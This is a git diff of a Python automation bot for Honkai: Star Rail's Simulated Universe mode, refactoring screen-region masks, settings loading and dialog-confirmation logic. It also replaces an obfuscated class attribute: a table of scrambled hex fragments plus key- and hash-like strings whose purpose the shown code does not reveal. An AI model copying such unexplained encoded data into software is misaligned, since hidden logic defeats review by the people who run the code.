@@ -2,21 +2,21 @@ import hashlib as _h
 import json
 import os
 import random
-import shutil
 import time
 from copy import deepcopy
 
 import cv2 as cv
 import numpy as np
 import pyautogui
-import yaml
 
 from tool.public_ocr import load_actions
 from route import PATHS
 from tool.storage import config_path, resource_path
-from tool import EXTRA, GLOBAL
+from tool.settings import load_settings
+from tool import GLOBAL
 from tool.GLOBAL import factor, key_mouse_manager
 from tool.log import CUS_LOGGER
+from tool.mask import MASK, crop_region
 from core.simulated.config import config
 from core.simulated.utils import UniverseUtils, get_dis, set_forground, sprint
 from tool.thread import ThreadWithException
@@ -124,22 +124,10 @@ class SimulatedUniverse(UniverseUtils):
                 self.img_map[file]= image
 
         CUS_LOGGER.debug(f"加载地图完成，共 {len(self.img_map)} 张")
-        settings_path = os.path.join(PATHS["config"], "settings.json")
-        example_path = os.path.join(PATHS["example"], "settings_example.json")
-        if not os.path.exists(settings_path) and os.path.exists(example_path):
-            shutil.copy2(example_path, settings_path)
-        with EXTRA.FILE_LOCK:
-            with open(settings_path, encoding="UTF-8") as file:
-                data = json.load(file)
+        data = load_settings()
 
-        config_file = config_path(__file__)
-        example_file = resource_path(__file__, "config/default.yml")
-        if not os.path.exists(config_file):
-            if os.path.exists(example_file):
-                shutil.copy2(example_file, config_file)
-
-        with open(config_file, encoding="utf-8", errors="ignore") as f:
-            self.event_prior = yaml.safe_load(f)["prior"]["事件"]
+        with open(config_path(__file__), encoding="utf-8") as f:
+            self.event_prior = json.load(f)["prior"]["事件"]
         self.record = data.get("recording_state", True)
 
         self.recorder = WindowRecorder(output_path=PATHS["video"], fps=30, window_title="崩坏：星穹铁道",window_class_name="UnityWndClass",see_time=True, offsets=[10, 50, 10, 10], overlay_map=self._show_map, simul_instance=self, task_owner=task_owner)
@@ -192,10 +180,10 @@ class SimulatedUniverse(UniverseUtils):
         self.update_floor(1)
         self.update_state("end")
 
-    nnbjiqzmvwouwll = [(202, '657a5a666b4c365c', 1), (818, '4501339012a030e', 0), (228, 'd0f6d2a250536', 1), (663, '22144c0b1', 1), (758, '4f3c171119', 1), (725, '361b4452424c49', 0), (178, '4501339012a030', 1), (131, '543422c182c472', 0), (672, '908013809432', 1), (879, 'c654a3c5b0f740d', 0), (864, 'e4f42100', 0), (520, 'b492c345a3', 1), (753, '4838594967', 1), (284, '19517a416e5', 0), (868, 'c5e3e094e49', 0), (429, '7addfd0dee4a0', 0), (384, 'e144c2408532944', 1), (627, 'f1a2e003c170633', 0), (917, 'a1d2b06171e07193', 1), (151, 'a1a4b566', 1), (424, '794967bdc5c', 1), (170, '93c54213c1535433', 0), (112, '3c035317497', 1), (620, '093327186504791', 1), (906, '9291f4c6b4c6', 0), (649, 'c207370666b4', 0), (447, 'fbaacef8bed2bca', 0), (255, '72b17103301502e', 1), (641, '520f32586', 1), (525, '42a02225c', 1), (263, '1c231034', 0), (138, '02213353f', 0), (719, '51654b3c441c', 0), (576, 'f1e1733435', 1), (117, 'a4f6e52424c0', 0), (511, '416e5242760', 1), (192, '2201075c', 1), (155, '319517a416', 1), (780, '5a342e1f', 0), (440, 'eee88d1b994f4', 1), (581, '7230f2b0d20', 1), (97, '1e0c78025c23146', 0), (763, '054d7b7a41', 0), (297, '2f24360923414c', 0), (826, '1c4904511', 0), (460, '9cebe88bdfb', 0), (696, '52421f0c551', 0), (597, '4072b0a06050e5', 0), (243, '17497a4f6', 0), (218, '351f48421c', 0), (887, '3817071e0c', 0), (304, '65197917497a4f', 1), (706, '61234443c5f', 1), (397, '2f3b446c33791', 0), (147, 'e362a0e3', 1), (858, '2a19573e03196', 1), (403, '7497a4f6e52420', 0), (794, 'f0c4905606b6', 1), (768, '6e5242764d123f09', 1), (11, '370a2939186551', 0), (566, '4123165744', 0), (436, '8fccc0a1c', 0), (414, '9152b163d22', 1), (746, '03618253b0b3c', 1), (546, '423b090712', 1), (541, '517a416e52', 1), (311, '391b1604495601', 0), (0, '271f12391f', 0), (682, '5281f353e0031', 1), (874, '657a5a666b4', 1), (551, '1a2505303', 0), (104, '663657a5a663f1e', 1), (503, '3a171a186319517a', 1), (289, '2103319473f0264', 0), (420, '084a394c', 0), (5, '466d0337632c', 1), (701, '77438053b1', 0), (65, '1d0d224f6f6d4764', 1), (925, '73b0d3d17', 0), (81, '4b3a5235060', 0), (325, '22c182c456', 0), (800, 'e5242764d12', 1), (267, '3b1466764c', 1), (210, '35514703', 1), (854, '36380351', 0), (392, '6d47362e08', 1), (776, '301c3734', 1), (530, '71024060656e5', 1), (377, '633045d447a5c6', 1), (18, '38440136062c7', 1), (841, '9657a0923270a6b', 1), (318, '3f0f6619072f324', 0), (635, '045d447a5c73', 0), (247, 'e521109055f5f381', 0), (477, '517a416e520f32', 1), (410, '91149143', 0), (678, '11c64546', 0), (470, 'f7c050684c4919', 0), (127, 'e3a520d2', 1), (35, '25085e2b', 1), (185, 'e1c4904511c00', 1), (612, 'd126d4c6449373f', 1), (53, '24f7352322', 1), (812, '4213c1535433', 0), (342, '1294f45191d5f', 0), (732, '19517a413d170e', 1), (667, 'e4001200c2', 1), (166, 'd4c370c2', 0), (454, 'bf1e18ed9c5', 1), (29, '1051722194a', 0), (571, '045d4405172', 1), (835, 'c4d126d4c644', 0), (214, '24070626', 1), (91, 'a652d31043d', 0), (604, 'c022e49677842764', 1), (806, '6d4c370c293c5', 1), (516, 'b5d3f4c1', 0), (367, 'c651979171', 0), (160, 'e5242764d126', 0), (196, '4d126d4c6449', 0), (86, '2211607001', 0), (655, 'c6519791749290a', 1), (645, 'd3b0d281', 0), (784, '30552d3d49', 1), (47, '093c6629561d3', 0), (712, '02192b15233e6b', 0), (334, '74c20573a580d330', 1), (587, '725d333f', 1), (58, 'd3d712201433c', 0), (488, '81c207a47662e14', 0), (849, '60127e1d1e', 0), (591, '0a68017e1e407', 0), (372, 'a2e003c170', 0), (39, '457e63657a5a6620', 0), (536, '2424c4919', 1), (789, '7a4f6e171a0', 0), (235, '3f70666b4c651979', 0), (355, '254d547766644965', 0), (830, 'c002201075', 1), (560, '244a315b0038', 0), (900, '0312704c02082', 0), (484, '586d3b0d2', 0), (24, '868080c5f5', 1), (496, '355c3a430c3e30', 1), (465, 'db08ce7bc', 1), (912, '5197917497', 0), (223, '11203d3b2e4', 1), (349, '5c6246675203', 1), (363, '7a5a666b4', 1), (73, '4b19060823380330', 0), (555, 'f5a7b6b04', 1), (330, '57d08616', 0), (272, '035835440c504', 1), (892, '55133911290b1337', 1), (123, '05f51340', 0), (689, '337917497a4f6e', 1), (278, 'f6e52424c49', 0), (739, '3043503b09211b2', 1), (143, '1f6d523c4', 1)]
+    nnbjiqzmvwouwll = [(453, 'ca8fddd4584c6b4', 0), (3, '271f12391f4', 0), (794, '3d497a4f6e', 1), (324, '47613e18231', 0), (833, 'e0a2b3e0b2a', 0), (959, '51497f10', 0), (297, '64d126d4c64', 1), (353, '030841105', 0), (889, '4f08130e', 0), (51, '620093c66295', 1), (197, '0a4452424c491951', 1), (563, '210c06410836', 1), (229, '4445242764d126d4', 1), (513, 'b4c65197917497a', 1), (219, '707153636525f4c', 0), (575, '3f0222220', 0), (598, '1401210c790', 0), (240, '000f195e0', 1), (990, '3902657f', 0), (831, '2f1d48200b3', 1), (714, 'b01173a19386d4c6', 0), (872, '0d1c2b76', 0), (509, '534f7a5a666', 1), (571, '0400a6a456d472d', 0), (66, '1433c1d0d224f', 0), (19, '370a29391', 1), (352, 'c790a493c413c17', 0), (53, '61d324f7', 0), (421, 'f5a6cdec', 1), (945, '3a470e23', 0), (415, 'eab5c6caa', 0), (918, '28002247', 1), (753, '979171a3f', 0), (960, '36122b78', 1), (866, '1c2c0b75', 0), (87, '7a416e5216', 0), (176, 'c494a143607', 0), (549, '81d2f046e', 0), (194, '6015152f1d482', 1), (773, '21e0c4d04280f6', 0), (14, '66d0337632c', 0), (299, '49652d13', 1), (306, '1310a372d120d1d5', 1), (488, 'e140d1e49', 1), (233, 'c6449657a', 0), (487, '17497a4f6', 0), (670, '0361c682c1', 1), (308, '15d7a463c554e760', 0), (740, '131b0a2b14', 0), (195, '00b3e0a2b3e0b2a3', 1), (201, '7a416e5242761', 0), (48, '57e63657a5a6', 1), (900, '7a416e52', 0), (507, '380a5765596d', 1), (567, '1a2b5c07020a5', 1), (212, '0e130e0212', 1), (83, '601601d0c', 1), (862, '0e30436b', 1), (749, '10531505', 1), (582, 'b204a2d1f40504f', 0), (375, 'a5a662e143', 0), (131, '92701162545', 1), (160, '7497a4f6e52424', 1), (825, 'a143607601515', 1), (364, 'f29153c1b127e', 0), (26, '62c786808', 0), (919, '272c1f23', 1), (265, '53211f216365', 1), (270, '7a5a666b4c6', 1), (365, '44386d4c6449657', 1), (153, 'e126f71666519791', 0), (140, '5928151b19242', 1), (489, '6651330f6e0003', 1), (120, 'd1d515f3f1', 0), (86, '02111b7b', 0), (470, 'f417352072e1d572', 0), (857, '7a413d17', 1), (738, '663809295f776e22', 0), (328, 'a0e3d52045663195', 1), (79, '1e196532521a3', 1), (444, '8dfc1b1f7b6a4d7', 0), (439, '8af49c96c6fea', 0), (110, '5231937581d7a', 1), (747, '70a426b4d40281f3', 0), (593, '8043d070e224d0f6', 0), (58, '352322d3d71220', 0), (213, '1a340a1f4', 0), (76, '9060f352e', 1), (972, '42764d12', 1), (792, 'f3e2809354d63', 0), (956, '1e2f1c42', 1), (387, '55c3a430', 0), (44, '194a25085e2b4', 0), (464, '2a473d1a0855043', 0), (674, 'b3c49235a0e2', 1), (758, 'c5c033f0d', 0), (222, '2f581d290', 1), (301, '32234c2a493c594', 0), (763, '2c111231144', 1), (103, '241408474c64', 0), (475, 'e18210d1a2', 0), (849, '05290a445242', 1), (885, '004f4967', 0), (205, 'e57210a6a30', 1), (234, '5a352e002317', 0), (772, '37917497a4f6e524', 1), (35, '0c5f51051722', 1), (403, '4904517886f1f3', 1), (568, '6153f496907163', 0), (276, 'b06171e0719373', 0), (841, '3b4c78191f56', 0), (813, '52424c494', 0), (275, '5197917497a1d2', 0), (250, '82b0020525f762b', 0), (237, '3b410c3f1d2b1e', 0), (409, '84e5f8d5f0fba2ff', 1), (396, 'c3e303a171a18', 1), (780, '666449657a1', 0), (677, '00c20161', 0), (982, '373f0e33', 0), (585, '6e52424c4919512', 0), (995, '385b1a3f', 0), (650, 'd126d4c641a2', 0), (930, '3909295b', 0), (478, 'e1f3e3f66651979', 1), (864, '0625302d', 0), (75, '6f6d47644b1', 0), (894, '1f0c3351', 1), (771, '1f353e00313', 1), (750, 'a666b4c651', 1), (560, '002d0b6b37', 1), (690, '30019194c7a132', 1), (624, '73d1a0855043f4', 1), (20, '86551384401360', 1), (778, 'e000725185e39', 1), (351, 'f221401210', 1), (557, '4f423e0c4125', 1), (416, 'fd4c5dcf7ad8de6', 0), (766, '32c0264546528', 1), (290, 'b0d3d17687', 0), (729, '449657a5a', 1), (595, 'd44371d2a281f22', 0), (852, '4c491951', 1), (755, '03285c001a0', 1), (341, '26d4c371d2a281', 1), (109, '49657a5a666b0', 0), (744, '1d5a7f01342e1', 1), (325, '46110407', 0), (317, '85c2e0320002b3d', 1), (638, '8445242764', 1), (978, '6d4c6449', 1), (562, '1e736301', 0), (333, '17a416e5242764d1', 0), (456, 'c65197917497a02', 0), (910, '42764d41', 1), (620, 'a547a022a4', 0), (114, '003d5c120', 1), (196, 'b4c78191f560529', 1), (524, '4f231657331f5', 0)]
 
     asvbmtlzxqpjss = "NrbVm2MlDiEZzFKlE9Y7iZoNrbli9qZa"
-    lzfabqrjwlwkqewl = "bec962fac609d0f375183bde6fdc3ed0"
+    lzfabqrjwlwkqewl = "db1365c68385223a12aa24d144612b45"
 
     def fjhpymcarnvrnzw(self, _jnnvrzfflfson, _esciqnhtlk):
         try:
@@ -406,21 +394,21 @@ class SimulatedUniverse(UniverseUtils):
         chose = 0
         if self.click_text(text="重置祝福",box=[1268, 1444, 929, 1025],click=False,warning=False):
             for _ in range(4):
-                img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask", fresh=True)
+                img_down = self.get_small_interaction_img(MASK["bless_path"], fresh=True)
                 if self.ts.split_and_find(self.tk.fates, img_down, mode="bless")[1] or self._stop:
                     break
                 if not self.click_text(text="选择祝福",box=[60, 222, 0, 113],click=False,ocr_line=False,warning=False):
                     return 1
-            img_up = self.get_small_interaction_img(x=0.5047, y=0.5491, mask="mask_bless", fresh=True)
+            img_up = self.get_small_interaction_img(MASK["bless_name"], fresh=True)
             res_up = self.ts.split_and_find(self.tk.prior_bless, img_up, mode="bless_skip=self.tk.skip")
-            img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask")
+            img_down = self.get_small_interaction_img(MASK["bless_path"])
             res_down = self.ts.split_and_find([self.fate], img_down, mode="bless")
             if res_up[1] == 2:
-                key_mouse_manager.click(*self.calc_point((0.5047, 0.5491), res_up[0]))
+                key_mouse_manager.click(*self.calc_point(MASK["bless_name"], res_up[0]))
                 key_mouse_manager.wait()
                 chose = 1
             elif res_down[1] == 2:
-                key_mouse_manager.click(*self.calc_point((0.5042, 0.3204), res_down[0]))
+                key_mouse_manager.click(*self.calc_point(MASK["bless_path"], res_down[0]))
                 key_mouse_manager.wait()
                 chose = 1
             if not chose:
@@ -429,43 +417,41 @@ class SimulatedUniverse(UniverseUtils):
         # 未匹配到优先祝福，刷新祝福并再次匹配
         if not chose:
             for _ in range(4):
-                img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask", fresh=True)
+                img_down = self.get_small_interaction_img(MASK["bless_path"], fresh=True)
                 if self.ts.split_and_find(self.tk.fates, img_down)[1] or self._stop:
                     break
                 CUS_LOGGER.debug("未识别到命途")
                 if not self.click_text(text="选择祝福",box=[60, 222, 0, 113],click=False,ocr_line=False,warning=False):
                     return 1
-            img_up = self.get_small_interaction_img(x=0.5047, y=0.5491, mask="mask_bless", fresh=True)
+            img_up = self.get_small_interaction_img(MASK["bless_name"], fresh=True)
             res_up = self.ts.split_and_find(self.tk.prior_bless, img_up, bless_skip=self.tk.skip)
-            img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask")
+            img_down = self.get_small_interaction_img(MASK["bless_path"])
             res_down = self.ts.split_and_find(self.tk.secondary, img_down, mode="bless")
             if res_up[1] == 2:
                 CUS_LOGGER.debug("识别到具体祝福")
-                key_mouse_manager.click(*self.calc_point((0.5047, 0.5491), res_up[0]))
+                key_mouse_manager.click(*self.calc_point(MASK["bless_name"], res_up[0]))
                 key_mouse_manager.wait()
             elif res_down[1] >= 2:
                 CUS_LOGGER.debug("识别到匹配命途")
-                key_mouse_manager.click(*self.calc_point((0.5042, 0.3204), res_down[0]))
+                key_mouse_manager.click(*self.calc_point(MASK["bless_path"], res_down[0]))
                 key_mouse_manager.wait()
             elif self.click_text(text="选择祝福",box=[60, 222, 0, 113],click=False,ocr_line=False,warning=False,allow_fail=True):
                 CUS_LOGGER.debug("未识别到具体祝福,随便选一个")
-                key_mouse_manager.click(*self.calc_point((0.5047, 0.5491), res_up[0]))
+                key_mouse_manager.click(*self.calc_point(MASK["bless_name"], res_up[0]))
                 key_mouse_manager.wait()
         self.click_text(text="确认",box=[1663, 1719, 949, 979],need_fresh=False,ocr_line=True,warning=True)
         key_mouse_manager.wait()
-        if self.quan:
-            self.use_e()
         return 1
     # F交互界面
     def do_interaction(self):
         # is_killed：是否是禁用的交互（沉浸奖励、复活装置、下载装置）
         is_killed = False
-        if self.check("f", 0.4443, 0.4417, mask="mask_f1", threshold=0.96, fresh=True):
+        if self.check("f", mask=MASK["f_key"], threshold=0.96, fresh=True):
             for _ in range(4):
-                img = self.get_small_interaction_img(x=0.3181, y=0.4324, mask="mask_f")
+                img = self.get_small_interaction_img(MASK["f_text"])
                 text = self.ts.similar_list(self.tk.interacts, img)
                 if text is None:
-                    img = self.get_small_interaction_img(x=0.3365, y=0.4231, mask="mask_f")
+                    img = self.get_small_interaction_img(MASK["f_text_2"])
                     text = self.ts.similar_list(self.tk.interacts, img)
                 if text is not None:
                     break
@@ -534,7 +520,7 @@ class SimulatedUniverse(UniverseUtils):
         n = 4  # 重试次数
         res = None
         while n:
-            img = self.get_small_interaction_img(x=0.4969, y=0.3750, mask="mask_fate", fresh=True)
+            img = self.get_small_interaction_img(MASK["fate"], fresh=True)
             res = self.ts.split_and_find([self.fate], img)
             if res[1] == 1 and n:
                 # 没有找到命途
@@ -544,7 +530,7 @@ class SimulatedUniverse(UniverseUtils):
                 continue
             else:
                 break
-        key_mouse_manager.click(*self.calc_point((0.4969, 0.3750), res[0]))
+        key_mouse_manager.click(*self.calc_point(MASK["fate"], res[0]))
     def select_bless(self):
         if not (self.click_text('神奇宇宙') or self.click_text('巨胃宇宙')):
             key_mouse_manager.click(0.5, 0.5)
@@ -612,7 +598,7 @@ class SimulatedUniverse(UniverseUtils):
         return 0.1135, 1 - (bottom + 76) / self.yy
 
     def scaled_box(self, box):
-        """把 1920x1080 基准的区域框 [左,右,上,下] 缩放到当前分辨率。（现在没用）"""
+        """把 1920x1080 基准的区域框 [左,右,上,下] 缩放到当前分辨率（寰宇蝗灾各模块的界面区域共用）。"""
         left, right, top, bottom = box
         if (self.xx, self.yy) == (1920, 1080):
             return list(box)
@@ -635,7 +621,7 @@ class SimulatedUniverse(UniverseUtils):
         return None
 
     def click_confirm_text(self, box):
-        """点「确定」文字框的中心（与 click_text 一致，用镜像比例坐标）。"""
+        """点按钮文字框的中心（「确定」「确认」共用，与 click_text 一致，用镜像比例坐标）。"""
         center_x = (box[0] + box[1]) / 2
         center_y = (box[2] + box[3]) / 2
         key_mouse_manager.click(1 - center_x / self.xx, 1 - center_y / self.yy)
@@ -734,21 +720,15 @@ class SimulatedUniverse(UniverseUtils):
         找出图标列里**所有**选项图标的中心，返回[{"x","y","score","icon"}]（屏幕坐标，按 y 排序，icon 是模板名）
         check() 只能拿到全局最高分的一个位置：一帧里有 3~5 条选项时只有最靠上的那个图标会被认出来。
         图标既是「选项出现了」的标志，也是每条选项横条的锚点，所以这里自己做多目标匹配，
-        与 check() 完全同一个搜索窗口，逐个模板取所有 > 0.95 的峰值，12 px 内只留最高的那个。
+        与 check() 完全同一个搜索区域（MASK["event_icon"]），逐个模板取所有 > 0.95 的峰值，12 px 内只留最高的那个。
         names：要匹配的图标模板名，默认就是 option_icon_names() 那一遍；补认的模板由
         extra_option_icon_names() 给出，只有第一遍没命中优选项时才会走到（见 select_event）。
         一个星号都没有说明这一帧不是选项界面，补认的模板那时也不匹配。
         """
         names = self.option_icon_names() if names is None else tuple(names)
-        mask_img = find_image_by_name("mask_event_icon")
-        if mask_img is None:
-            self._option_icons = []
-            return []
-        shape = (int(self.scx * mask_img.shape[0]), int(self.scx * mask_img.shape[1]))
-        anchor_x, anchor_y = 0.2865, 0.5000
-        local = self.get_local(anchor_x, anchor_y, shape)
-        left = max(0, self.xx - int(anchor_x * self.xx) - (shape[1] + 60) // 2)
-        top = max(0, self.yy - int(anchor_y * self.yy) - (shape[0] + 60) // 2)
+        region = MASK["event_icon"]
+        local = crop_region(self.screen, region)
+        left, top = region[0], region[2]
         icons = []
         for name in names:
             if name != "star" and "star" in names and not icons:
@@ -825,17 +805,17 @@ class SimulatedUniverse(UniverseUtils):
     # 事件界面：由左上角「事件」文字触发，一次调用把事件界面这一帧该做的事按优先级走完：
     #   金色 ▼（对话阶段）→ 推进图标（arrow → arrow_1 → shop_herta）→ 界面标题让路（奇物商店等）
     #   → 选项图标（选项出现的标志）→ 选项识别选择 + warning/兜底选项 + 点击「确定」
-    # 选项图标都在左侧图标列，用 mask_event_icon（窗口 180x960）。
+    # 选项图标都在左侧图标列，用 MASK["event_icon"]。
     # 选项区什么都读不到时就什么都不点，并补一条 warning 说明这一帧整个函数什么都没识别到。
     # 选项图标（星号 ※）出现就代表选项出现了，它和选项文字绑定：
     # event_option_rows 先把所有选项图标都认出来，再只 OCR 每个图标右侧的文字。
     def select_event(self):
         screen = self.get_screen()
-        if self.check("arrow_dialog", 0.1781, 0.3250, mask="mask_dialog"):
+        if self.check("arrow_dialog", mask=MASK["dialog"]):
             key_mouse_manager.click(self.tx, self.ty)
             return
         for photo in ("arrow", "arrow_1", "shop_herta"):
-            if self.check(photo, 0.2865, 0.5000, mask="mask_event_icon"):
+            if self.check(photo, mask=MASK["event_icon"]):
                 key_mouse_manager.click(self.tx, self.ty)
                 return
         # 若检测到切换到奇物商店或祝福强化界面：交给对应动作处理
@@ -879,10 +859,10 @@ class SimulatedUniverse(UniverseUtils):
             # 事件名先读出来：下面不管是「先等面板淡入」还是兜底，日志里都要写事件名。
             # 读到的名字会缓存进 self.event，本帧只读这一次，后面的帧直接用缓存。
             event_name = self.event_name_for_log(screen)
-            if self._option_shown_at is not None and time.time() - self._option_shown_at < 0.8:
-                # 选项面板是淡入的：先出选项文字、后出选项图标，在这不到 0.8 s 的窗口里按兜底点会点错。
+            if self._option_shown_at is not None and time.time() - self._option_shown_at < 1.5:
+                # 选项面板是淡入的：先出选项文字、后出选项图标，在这不到 1.5 s 的窗口里按兜底点会点错。
                 # 所以本帧先不决定，也不 sleep：直接返回，下一帧重新截图重新认，
-                # 那时图标已经正常显示，优选项自然就命中了。等满 0.8 s 还没命中才照旧走兜底。
+                # 那时图标已经正常显示，优选项自然就命中了。等满 1.5 s 还没命中才照旧走兜底。
                 CUS_LOGGER.debug(f"事件「{event_name}」选项面板刚出现（图标可能还在淡入），本帧不点击")
                 return
             # 没有战斗的事件不存在优选项
@@ -903,9 +883,9 @@ class SimulatedUniverse(UniverseUtils):
 
     # 选取奇物
     def select_strange(self):
-        img = self.get_small_interaction_img(x=0.5000, y=0.7333, mask="mask_strange", fresh=True)
+        img = self.get_small_interaction_img(MASK["strange_name"], fresh=True)
         res = self.ts.split_and_find(self.tk.strange, img, mode="strange")
-        key_mouse_manager.click(*self.calc_point((0.5000, 0.7333), res[0]))
+        key_mouse_manager.click(*self.calc_point(MASK["strange_name"], res[0]))
         key_mouse_manager.click(0.1365, 0.1093)
         self.wait_flag(lambda: self.click_text(text="选择奇物",box=[5, 219, 3, 111],click=False,ocr_line=False,warning=False), 1.4)
     # 丢弃奇物
@@ -918,12 +898,12 @@ class SimulatedUniverse(UniverseUtils):
         clicked = 0
         for i, ft in enumerate(self.tk.secondary[::-1]):
             if ft != self.fate or i == len(self.tk.secondary):
-                img_down = self.get_small_interaction_img(x=0.5042, y=0.3204, mask="mask", fresh=True)
+                img_down = self.get_small_interaction_img(MASK["bless_path"], fresh=True)
                 if self.debug == 2:
                     CUS_LOGGER.debug(f"St: {list(st)}, Secondary: {self.tk.secondary}")
                 res_down = self.ts.split_and_find(list(st), img_down, mode="bless")
                 if res_down[1] == 2:
-                    key_mouse_manager.click(*self.calc_point((0.5042, 0.3204), res_down[0]))
+                    key_mouse_manager.click(*self.calc_point(MASK["bless_path"], res_down[0]))
                     clicked = 1
                     break
                 st.add(ft)
@@ -946,10 +926,28 @@ class SimulatedUniverse(UniverseUtils):
         key_mouse_manager.press("esc")
         if self.floor >= 13:
             self.update_floor(12)
+
     def confirm_yes(self):
-        if self.click_text(text="确认",click=False,delay=1,after_delay=1):
-            key_mouse_manager.click(self.tx, self.ty)
-            key_mouse_manager.wait()
+        """
+        点掉弹窗上的「确认」按钮。点击位置只取这一帧 OCR 到的「确认」文字块。
+        这一帧没认到就不点，等下一帧重新识别。
+        """
+        # 若处于作弊界面，则不点「确认」
+        if self.click_text(text="作弊", box=[923, 996, 230, 270], click=False, allow_fail=True):
+            CUS_LOGGER.debug("当前处于作弊选项窗，跳过点击「确认」")
+            return 0
+        # 在弹窗中找「确认」按钮的文字框 [左,右,上,下]; re_screen=True 让这里每次独立截一帧。
+        rows = [
+            row for row in self.ts.find_with_box(box=[232, 1690, 154, 928], forward=True, re_screen=True)
+            if isinstance(row, dict) and "确认" in (row.get("raw_text") or "")
+        ]
+        # 弹窗标题里也可能带「确认」（如「确认丢弃祝福「X」？」），按钮永远在标题下方，所以取最靠下的那一块文字。
+        box = list(max(rows, key=lambda row: row["box"][3])["box"]) if rows else None
+        if box is None:
+            CUS_LOGGER.warning("没识别到弹窗的「确认」文字，等下一帧重试")
+            return 0
+        self.click_confirm_text(box)
+        key_mouse_manager.wait()
         return 0
 
     def update_count(self, read=True):
@@ -1122,7 +1120,7 @@ class SimulatedUniverse(UniverseUtils):
         1. 从PNG图像文件恢复地图图像数据(big_map)
         2. 从JSON文件恢复其他地图相关属性
 
-        备份文件从项目目录下的config/backup文件夹中读取。
+        备份文件从项目目录下的user/backup文件夹中读取。
         """
         try:
             # 从磁盘读取 big_map 图像文件
